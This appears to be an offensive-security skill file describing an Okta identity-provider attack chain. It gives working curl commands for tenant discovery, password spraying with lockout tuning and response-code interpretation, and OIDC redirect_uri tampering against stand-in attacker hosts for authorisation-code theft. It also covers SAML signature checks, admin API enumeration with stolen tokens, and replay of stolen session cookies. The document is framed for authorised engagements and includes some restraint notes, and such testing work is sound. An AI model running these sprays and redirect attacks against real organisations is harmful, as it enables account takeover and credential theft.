# Moraa — Okta IdP attack chain

> Trigger: `<tenant>.okta.com`/`.okta-emea.com`/`.oktapreview.com`, login redirect to
> `/app/<app_id>/sso/saml`, `*.okta.com` cert SAN, `auth-js-sdk` in page source. Sibling skill to
> `m365-entra-attack.md` — identical mental model, different endpoints/lockout math.

## Tenant discovery
```bash
for tenant in brand brand-ltd brand-sister; do for region in okta okta-emea oktapreview; do
  code=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 "https://$tenant.$region.com/")
  [ "$code" != "404" ] && [ "$code" != "000" ] && echo "  $tenant.$region.com  $code"; done; done
dig +short sso.client.example CNAME; dig +short login.client.example CNAME
curl -skL -o /dev/null -w "%{redirect_url}\n" "https://app.target.com/login"   # → *.okta.com confirms
```

## Auth flow analysis — always do this before spraying
```bash
curl -sk -X POST "https://<tenant>.okta.com/api/v1/authn" -H "Content-Type: application/json" \
  -d '{"username":"<valid_user>","password":"_test_invalid_pw"}' | python3 -m json.tool
```
The `_embedded.factors` list in the response reveals phishing-resistance per factor:
`webauthn`(FIDO2, resistant) > `totp`(AiTM-able) > `sms`/`call`/`push`(fatigue-able) >
`question`(KBA, weak). Know the factor set before deciding whether MFA is even a real wall.

## Spray — status codes and lockout discipline
| Response | Meaning |
|---|---|
| `200 MFA_REQUIRED` | **password VALID** |
| `200 PASSWORD_EXPIRED` | **password VALID**, must change |
| `200 SUCCESS + sessionToken` | full auth (rare, MFA not required) |
| `200 LOCKED_OUT` | locked |
| `401 E0000004` | fail (Okta unifies invalid-user/invalid-pw — no enum here) |
| `401 E0000119` | user locked |
| `429` | rate-limited |

Okta default: **10 failed → lockout** (some orgs: 3). Discipline: ≤2 attempts/user lifetime,
atomic state file, stop on first hit or LOCKED-rate spike. User enumeration via `/api/v1/authn`
differential errors is **hardened as of 2024+** — confirm freshness each engagement (probe 1
known-existing + 1 known-nonexistent user, byte-compare) before relying on it; pivot to OneDrive
equivalent (`m365-entra-attack.md`) or org-specific identifier guessing
(`firstname.lastname@`/`flastname@`/employee-ID) if hardened.

## OIDC redirect_uri tampering
```bash
curl -sk "https://<tenant>.okta.com/.well-known/openid-configuration" | python3 -m json.tool
for ruri in "https://attacker.example.com/" "https://target.com.attacker.com/" \
    "https://target.com@attacker.com/" "//attacker.com/"; do
  curl -sk -o /dev/null -w "%{http_code} $ruri\n" \
    "https://<tenant>.okta.com/oauth2/v1/authorize?client_id=<client>&response_type=code&scope=openid&redirect_uri=$(python3 -c "import urllib.parse;print(urllib.parse.quote('$ruri'))")"
done
# 302 with attacker URL in Location = open redirect → auth-code theft chain (auth-oauth.md)
```

## Per-app SAML SP check
```bash
curl -sk "https://<tenant>.okta.com/app/<app_id>/sso/saml/metadata"
# AuthnRequestsSigned="false" → XSW candidate (auth-oauth.md § SAML SSO attacks)
# WantAssertionsSigned="false" → assertion-replay possible
```

## Post-cred-compromise admin API
```bash
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/users"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/groups"
curl -sk -H "Authorization: SSWS <token>" "https://<tenant>.okta.com/api/v1/logs"   # audit log
```

## Push-fatigue / FastPass abuse
Out of scope for non-phishing engagements (social engineering) — document the factor's existence,
don't execute without explicit sign-off. Detection-only: initiate `/api/v1/authn/factors/<id>/verify`
once to confirm push is configured; don't loop it.

## Real-world attack patterns worth citing in a report
The pattern across every major disclosed Okta incident (LAPSUS$/Sitel 2022, HAR-file leak 2023,
Scattered Spider cross-tenant impersonation 2023, stealer-cookie session replay ongoing) is:
**the attack rarely hits Okta's product code — it hits the trust relationships around Okta**
(third-party support, help-desk identity verification, customer-uploaded diagnostic artifacts,
federated IdPs). Recon should map these trust edges, not just spray passwords. Two pure-product
CVEs worth knowing: CVE-2024-0981 (bcrypt 72-byte truncation collapsed the AD/LDAP DelAuth cache
key to password-independent past a 52-char username) and CVE-2024-10327 (Okta Verify iOS: tapping
"No, it's not me" on a push still approved auth — silently defeats push-fatigue awareness).
Session cookies are bearer tokens until device-binding is enforced — a stealer-malware `sid` cookie
from `<tenant>.okta.com`/`<tenant>-admin.okta.com` replays MFA-free from anywhere.

## Anti-patterns
Don't use Entra-pace spray timing on Okta (different anti-automation tuning, hits limits faster).
Don't skip factor enumeration before spraying. Don't treat `oktapreview.com` as production (weaker
security, different severity). Don't assume 2022-era enum techniques still work — verify freshness.

## Bridge
`m365-entra-attack.md` (hybrid orgs federate Okta→Entra — an Okta ATO can grant M365 access without
ever touching `login.microsoftonline.com`, bypassing Entra CA), `auth-oauth.md` § SAML (XSW per
federated app — a compromised Okta admin mints legitimately-signed assertions for any downstream
app, no XSW needed), `2fa-bypass.md` (factor-downgrade after spray hits MFA wall).
